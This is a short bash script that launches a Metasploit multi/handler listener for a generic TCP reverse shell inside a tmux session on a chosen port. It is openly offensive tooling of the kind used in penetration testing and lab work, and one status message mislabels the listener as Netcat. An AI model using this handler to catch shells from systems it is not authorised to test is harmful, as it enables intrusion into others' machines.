#!/bin/bash
# ARGS
# PORT "Desired port for handler"
# ENDARGS
# AUTHOR: Mitchell Kerns

# This script starts a msf listener inside a tmux session
# Default is generic tcp rev shell

TMUX_SESSION="msf_handler"
MSF_PORT=$1

# Check if the tmux session already exists
if tmux has-session -t $TMUX_SESSION 2>/dev/null; then
    echo "Session $TMUX_SESSION already exists."
    echo "Use 'tmux attach -t $TMUX_SESSION' to interact with the session."
else
    echo "Creating new tmux session named $TMUX_SESSION and starting Netcat listener on port $MSF_PORT..."
    # Create a new tmux session and run msf
    tmux new-session -d -s $TMUX_SESSION "msfconsole -q -x 'use exploit/multi/handler; set LHOST eth0; set LPORT $1; run'"
    echo "MSF listener started in tmux session $TMUX_SESSION on port $MSF_PORT"
    echo "Use 'tmux attach -t $TMUX_SESSION' or the UI to interact with the session."
fi

# If you want to change the payload, just interact with the tmux session, and stop the handler with ctrl + c, then make your changes.